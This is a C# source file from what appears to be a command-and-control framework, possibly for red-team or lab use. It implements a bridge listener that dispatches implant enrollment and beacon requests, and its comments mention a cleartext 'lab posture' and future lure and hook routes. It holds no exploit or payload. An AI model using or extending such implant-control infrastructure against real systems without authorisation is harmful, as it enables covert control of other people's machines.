using Microsoft.Extensions.Logging;
using Rod.CoreState.Transports;
using Rod.Transport.Endpoints;
using Rod.Transport.Listeners.Streams;

namespace Rod.Transport.Listeners.Bridge;

// The route-forward carriage's kernel half (ADR-025, the https shape): one
// duplex connection per medium peer carrying request/answer units --
// field maps, nothing positional -- dispatched by path. The routes are the
// implant family's own -- the JSON enroll exchange and the envelope
// contact -- driven through the same cores the HTTP routes drive, so a
// contact that crossed the bridge is indistinguishable in core state, the
// audit trail, and the live bus from one that crossed Kestrel. The scope
// is the peer: this bridge belongs to one listener, known directly, no
// local port to resolve.
//
// The unit's observed facts (peer, ua, and whatever a later medium
// honestly observes) ride the map for the routes that audit by them; the
// web families' asset routes (hooks, lures, artifact fetch) are the same
// carriage's later arms -- the map already carries the method, the path,
// and the facts they audit by, so landing them is a dispatch entry, never
// a carriage change.

/// <summary>
/// Serves one route-forward connection: request units in, answer units
/// out, until the peer goes or the listener stops.
/// </summary>
internal sealed class BridgeRouteForwarder
{
    private readonly EnrollmentExchange _enrollment;
    private readonly EnvelopeContactCore _contact;
    private readonly ILogger<BridgeRouteForwarder> _logger;

    public BridgeRouteForwarder(
        EnrollmentExchange enrollment,
        EnvelopeContactCore contact,
        ILogger<BridgeRouteForwarder> logger)
    {
        _enrollment = enrollment;
        _contact = contact;
        _logger = logger;
    }

    public async Task ServeAsync(
        Stream stream,
        Listener listener,
        CancellationToken stoppingToken)
    {
        // The route carriage's identity fallback mirrors the HTTP route's:
        // an implant may stand by its handshake id alone when the front it
        // dialed is cleartext -- the lab posture. The front implants dial is
        // the listener's public endpoint, so its scheme decides.
        var cleartextFallback = !listener.PublicEndpoint.StartsWith(
            "https://", StringComparison.OrdinalIgnoreCase);

        while (!stoppingToken.IsCancellationRequested)
        {
            byte[] wire;
            try
            {
                wire = await StreamContactFraming.ReadMessageAsync(stream, stoppingToken);
            }
            catch (Exception ex) when (
                ex is IOException or OperationCanceledException or ObjectDisposedException
                or System.Net.Sockets.SocketException)
            {
                // The peer went or the listener is stopping: the connection
                // ends, and the peer's next request reconnects.
                return;
            }

            // A unit without its method and path is malformed -- the same
            // dropped connection every bridge shape keeps. The body is
            // optional-shaped (an empty POST is still a POST).
            if (!BridgeRouteProtocol.TryDecodeUnit(wire, out var request)
                || !request.TryGetValue(BridgeRouteProtocol.MethodKey, out var methodBytes)
                || !request.TryGetValue(BridgeRouteProtocol.PathKey, out var pathBytes))
                return;
            var method = System.Text.Encoding.UTF8.GetString(methodBytes);
            var path = System.Text.Encoding.UTF8.GetString(pathBytes);
            var body = request.TryGetValue(BridgeRouteProtocol.BodyKey, out var bodyBytes)
                ? bodyBytes
                : [];

            byte[] answer;
            try
            {
                var served = await DispatchAsync(method, path, body, listener, cleartextFallback, stoppingToken);
                answer = EncodeAnswer(served.Status, served.ContentType, served.Body);
            }
            catch (Exception ex) when (ex is OperationCanceledException or IOException)
            {
                return;
            }
            catch (Exception ex)
            {
                _logger.LogInformation(
                    ex, "Bridge route dispatch failed on listener {Name} for {Path}.", listener.Name, path);
                answer = EncodeAnswer(
                    502, "application/json; charset=utf-8",
                    ProblemBytes("The forwarded request could not be served."));
            }

            try
            {
                await StreamContactFraming.WriteMessageAsync(stream, answer, stoppingToken);
            }
            catch (Exception ex) when (
                ex is IOException or OperationCanceledException or ObjectDisposedException
                or System.Net.Sockets.SocketException)
            {
                return;
            }
        }
    }

    private async Task<(int Status, string ContentType, byte[] Body)> DispatchAsync(
        string method,
        string path,
        byte[] body,
        Listener listener,
        bool cleartextFallback,
        CancellationToken cancellationToken)
    {
        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
            && string.Equals(path, "/implants/enroll", StringComparison.Ordinal))
        {
            var enroll = await _enrollment.HandleAsync(body, listener, cancellationToken);
            return (enroll.Status, enroll.ContentType, enroll.Body);
        }

        if (string.Equals(method, BridgeRouteProtocol.MethodPost, StringComparison.Ordinal)
            && string.Equals(path, "/implants/beacon", StringComparison.Ordinal))
        {
            var contact = await _contact.ContactAsync(
                body,
                new EnvelopeContactOptions(
                    EnvelopeBeaconContact.MaxDispatchBytes,
                    TransportCapabilities.Envelope,
                    "bridge",
                    CleartextIdentityFallback: cleartextFallback,
                    Enrollment: new EnvelopeEnrollmentContext(listener)),
                cancellationToken);
            return contact.Status switch
            {
                200 => (
                    200,
                    contact.Sealed ? "text/plain; charset=utf-8" : "application/octet-stream",
                    contact.Body),
                401 => (401, "application/json; charset=utf-8", ProblemBytes(contact.Problem ?? "The contact was refused.")),
                413 => (413, "application/octet-stream", []),
                _ => (400, "application/json; charset=utf-8", ProblemBytes(contact.Problem ?? "The request body was refused.")),
            };
        }

        return (404, "application/json; charset=utf-8", ProblemBytes("No such route on this listener's bridge."));
    }

    private static byte[] EncodeAnswer(int status, string contentType, byte[] body)
        => BridgeRouteProtocol.EncodeUnit(
        [
            KeyValuePair.Create(
                BridgeRouteProtocol.StatusKey,
                System.Text.Encoding.ASCII.GetBytes(
                    status.ToString(System.Globalization.CultureInfo.InvariantCulture))),
            KeyValuePair.Create(BridgeRouteProtocol.ContentTypeKey, System.Text.Encoding.UTF8.GetBytes(contentType)),
            KeyValuePair.Create(BridgeRouteProtocol.BodyKey, body),
        ]);

    private static byte[] ProblemBytes(string problem)
        => System.Text.Json.JsonSerializer.SerializeToUtf8Bytes(
            new Problem(problem), System.Text.Json.JsonSerializerOptions.Web);
}
